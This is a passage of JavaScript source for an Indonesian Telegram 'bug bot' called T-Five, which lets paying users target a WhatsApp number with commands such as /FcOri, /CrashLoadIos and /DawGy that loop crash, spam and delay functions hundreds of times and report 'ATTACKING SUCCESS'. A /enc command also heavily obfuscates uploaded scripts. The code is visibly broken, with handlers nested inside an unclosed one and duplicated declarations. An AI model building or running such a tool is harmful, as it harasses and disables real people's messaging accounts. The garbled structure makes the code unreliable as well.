    );
  }
});

bot.onText(/\/FcOri(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /FcOri <nomor>
┃ ◇ Contoh: /FcOri 628123456789
║ ◇ Note : jeda 5-10 menit  
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : FcOri
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
    for (let i = 0; i < 3; i++) {
      await newspamfc(taka, target)
      await OverloadCursor(taka, target)
      await newspamfc(taka, target)
      await OverloadCursor(taka, target)
    }

  } catch (error) {
    console.error("Error in FcOri:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/Bulldozer-maker(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /Bulldozer-maker <nomor>
┃ ◇ Contoh: /Bulldozer-maker 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : Bulldozer-maker
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
    for (let i = 0; i < 200; i++) {
      await bulldozer(taka, target)
      await bulldozer(taka, target)
      await RansSuperDelay(taka, target, mention = false)
      await RansSuperDelay(taka, target, mention = false)
    }

  } catch (error) {
    console.error("Error in Bulldozer-maker:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/Delaymaker(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /cloud <nomor>
┃ ◇ Contoh: /cloud 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : cloud
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    bot.onText(/\/ComboCrashKipopBlack(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /ComboCrashKipopBlack <nomor>
┃ ◇ Contoh: /ComboCrashKipopBlack 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : ComboCrashKipopBlack
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : ComboCrashKipopBlack
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
   for (let r = 0; r < 20; r++) {
await ComboCrashKipopBlack(taka, target)
await new Promise(resolve => setTimeout(resolve, 500));
}

  } catch (error) {
    console.error("Error in kipop:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
    bot.onText(/\/CrashLoadIos(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /CrashLoadIos <nomor>
┃ ◇ Contoh: /CrashLoadIos 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashLoadIos
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashLoadIos
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
   for (let r = 0; r < 20; r++) {
await CrashLoadIos(taka, target)
await new Promise(resolve => setTimeout(resolve, 500));
}

  } catch (error) {
    console.error("Error in kipop:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
bot.onText(/\/DawGy(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /DawGy <nomor>
┃ ◇ Contoh: /DawGyos 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : DawGy
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : DawGy
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
   for (let x = 0; x < 1000; x++) {
  await DawGy(client, target);
  await new Promise(dawgy => setTimeout(dawgy, 1000));
}

  } catch (error) {
    console.error("Error in DawGy:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

// BUTTONS MENU
const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [{
         text: "OWNER MENU", 
         callback_data: "owner"
      },{ 
         text: "BUG MENU", 
         callback_data: "bugmenu" 
      }],
      [{ 
         text: "Tanks - To", 
         callback_data: "tqto" 
      }],
      [{ 
         text: "All Dev - taka", 
         callback_data: "support" 
      }],
    ],
  },
};

// BUTTON BACK
const menuWithBackButton = {
  reply_markup: {
    inline_keyboard: [
      [{ 
        text: "⬅️ Back",
        callback_data: "back" 
      }],
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(
    __dirname, 
    "assets", 
    "images",
    imageName
  );
  if (!fs.existsSync(imagePath)) {
    throw new Error("File gambar tidak ditemukan");
  }
  return imagePath;
}

bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id
  const timescale = getUptime();
  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
      caption: `\`\`\`
╔━━━━━━━━━━━━━━━━━━━━━•
┃々 Name : T-Five
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : @TakashiMieAyam1
┃々 Vᴇʀsɪᴏɴ : 1.0.0
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
┃
┃ for other menus click on the button below 
╚━━━━━━━━━━━━━━━━━━━━━━•\`\`\``,
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(
      chatId,
      `\`\`\`
╔━━━━━━━━━━━━━━━━━━━━━•
┃々 Name : T-Five
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : @TakashiMieAyam1
┃々 Vᴇʀsɪᴏɴ : 1.0.0
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
┃
┃ for other menus click on the button below 
╚━━━━━━━━━━━━━━━━━━━━━━•\`\`\``,
      {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      }
    );
  }
});

bot.on("callback_query", async (query) => {
  await bot.answerCallbackQuery(query.id).catch(console.error);
 const timescale = getUptime();
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let caption;
  let buttons;

  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    switch (query.data) {
      case "owner":
        caption = `\`\`\`
╭─────────────────
│    OWNER MENU    
│────────────────
│ /addbot <number>
│ /addprem <id>
│ /delprem <id>
│ /addowner <id>
│ /delowner <id>
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;

      case "bugmenu":
        caption = `\`\`\`
╭─────────────────
│    BUG MENU    
│────────────────
│ /Delaymaker <number>
│ /Bulldozer-maker <number>
│ /FcOri <number>
│ /UI-Sistem <number>
 | /ComboCrashKipopBlack <number>
 | /CrashLoadIos <number>
 | /DawGy <number>
 | /CrashIos <number>
 | /CrashFaridz <number>
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
case "tqto":
        caption = `\`\`\`
      TANKS - TO
╭────────────────
│ fauzan( Guru ) 
│ rahman ( Friends + Support )
 | malam ( karna di waktu malam la tepat
 |paling nyaman )
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
        
case "supoort":
        caption = `\`\`\`
       ALL - DEV
╭────────────────
|  gada
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
//otomatis ke tampilan awal        
      case "back":
        caption = `\`\`\`
╔━━━━━━━━━━━━━━━━━━━━━•
┃々 Name : T-Five
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : @TakashiMieAyam1
┃々 Vᴇʀsɪᴏɴ : 1.0.0
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
┃
┃ for other menus click on the button below 
╚━━━━━━━━━━━━━━━━━━━━━━•\`\`\``;
        buttons = mainMenuButtons;
        break;
        
    }

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      ...buttons,
    });
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.sendMessage(chatId, caption, {
      parse_mode: "Markdown",
      ...buttons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${userId} sudah
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN
│────────────────
│ ID: ${userId}
│ Status: Premium User
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS
│────────────────
│ User ${userId} tidak
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS  
│────────────────
│ ID: ${userId}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/enc/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMessage = msg.reply_to_message;
  
  if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
    return bot.sendMessage(chatId, '[ ! ] Reply .js');
  }

  const fileId = replyMessage.document.file_id;
  const fileName = replyMessage.document.file_name;
      
  const fileLink = await bot.getFileLink(fileId);
  const response = await axios.get(fileLink, { 
    responseType: 'arraybuffer'
  });
  
  const codeBuffer = Buffer.from(response.data);
  const tempFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(tempFilePath, codeBuffer);
  
  bot.sendMessage(chatId, "[ ! ] WAITTING FOR PROCCESS....");
  const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
    jid: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function () {
      const originalString = "肀fantasi crash金" + "肀fantasi crash金";
        function removeUnwantedChars(input) {
          return input.replace(/[^a-zA-Z肀fantasi crash金]/g, '');
        }
        function randomString(length) {
          let result = '';
          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
          for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
          }
          return result;
        }
        return removeUnwantedChars(originalString) + randomString(2);
      }, 
      renameVariables: true,
      renameGlobals: true,
      stringEncoding: true,
      stringSplitting: 0.0,
      stringConcealing: true,
      stringCompression: true,
      duplicateLiteralsRemoval: 1.0,
      shuffle: { hash: 0.0, true: 0.0 },
      stack: true,
      controlFlowFlattening: 1.0,
      opaquePredicates: 0.9,
      deadCode: 0.0,
      dispatcher: true,
      rgf: false,
      calculator: true,
      hexadecimalNumbers: true,
      movedDeclarations: true,
      objectExtraction: true,
      globalConcealing: true
    });
  
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);
      
    bot.sendDocument(chatId, encryptedFilePath, {
      caption: `[ ! ] SUCCESSFULLY ENC HARD!!`
    });
  });
